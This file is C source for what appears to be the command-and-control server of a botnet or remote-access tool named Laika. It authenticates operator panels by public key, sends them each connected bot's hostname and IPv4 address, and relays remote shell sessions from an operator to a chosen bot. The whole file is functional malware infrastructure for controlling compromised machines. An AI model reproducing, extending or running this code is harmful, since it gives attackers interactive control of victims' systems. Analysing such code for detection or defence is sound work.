#include "lerror.h"
#include "cnc.h"
#include "cpanel.h"

bool sendPanelPeerIter(struct sLaika_peer *peer, void *uData) {
    struct sLaika_peer *authPeer = (struct sLaika_peer*)uData;

    /* make sure we're not sending connection information to themselves */
    if (peer != authPeer) {
        LAIKA_DEBUG("sending peer info %p to auth %p)\n", peer, authPeer);
        laikaC_sendNewPeer(authPeer, peer);
    }

    return true;
}

void laikaC_sendNewPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_ADD_PEER_RES);

    /* write the peer's info */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_write(&authPeer->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
    laikaS_write(&authPeer->sock, peer->ipv4, LAIKA_IPV4_LEN);
    laikaS_writeByte(&authPeer->sock, peer->type);

    laikaS_endOutPacket(authPeer);
}

void laikaC_sendRmvPeer(struct sLaika_peer *authPeer, struct sLaika_peer *peer) {
    laikaS_startOutPacket(authPeer, LAIKAPKT_AUTHENTICATED_RMV_PEER_RES);

    /* write the peer's pubkey */
    laikaS_write(&authPeer->sock, peer->peerPub, sizeof(peer->peerPub));
    laikaS_writeByte(&authPeer->sock, peer->type);

    laikaS_endOutPacket(authPeer);
}

/* ============================================[[ Packet Handlers ]]============================================= */

void laikaC_handleAuthenticatedHandshake(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
    struct sLaika_cnc *cnc = pInfo->cnc;
    authPeer->type = laikaS_readByte(&authPeer->sock);

    switch (authPeer->type) {
        case PEER_AUTH:
            /* check that peer's pubkey is authenticated */
            if (sodium_memcmp(authPeer->peerPub, cnc->pub, sizeof(cnc->pub)) != 0)
                LAIKA_ERROR("unauthorized panel!\n");

            /* notify cnc */
            laikaC_setPeerType(cnc, authPeer, PEER_AUTH);
            LAIKA_DEBUG("Accepted authenticated panel %p\n", authPeer);

            /* they passed! send list of our peers */
            laikaC_iterPeers(cnc, sendPanelPeerIter, (void*)authPeer);
            break;
        default:
            LAIKA_ERROR("unknown peerType [%d]!\n", authPeer->type);
    }
}

void laikaC_handleAuthenticatedShellOpen(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t pubKey[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
    struct sLaika_cnc *cnc = aInfo->info.cnc;
    struct sLaika_peer *peer;

    /* sanity check, make sure shell isn't already open */
    if (aInfo->shellBot)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Shell already open!\n");

    /* read pubkey & find peer */
    laikaS_read(&authPeer->sock, pubKey, crypto_kx_PUBLICKEYBYTES);
    if ((peer = laikaC_getPeerByPub(cnc, pubKey)) == NULL)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer doesn't exist!\n");

    if (peer->type != PEER_BOT)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellOpen: Requested peer isn't a bot!\n");

    /* link shells */
    aInfo->shellBot = peer;
    ((struct sLaika_botInfo*)(peer->uData))->shellAuth = authPeer;

    /* forward the request to open a shell */
    laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_OPEN);
}

void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_SIZE sz, void *uData) {
    uint8_t data[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_authInfo *aInfo = (struct sLaika_authInfo*)uData;
    struct sLaika_cnc *cnc = aInfo->info.cnc;
    struct sLaika_peer *peer;

    /* sanity check, make sure shell is open */
    if ((peer = aInfo->shellBot) == NULL)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Not shell open!\n");

    if (sz > LAIKA_SHELL_DATA_MAX_LENGTH)
        LAIKA_ERROR("laikaC_handleAuthenticatedShellData: Data too big!\n");

    /* read data */
    laikaS_read(&authPeer->sock, data, sz);

    /* forward data to peer */
    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
    laikaS_write(&peer->sock, data, sz);
    laikaS_endVarPacket(peer);
}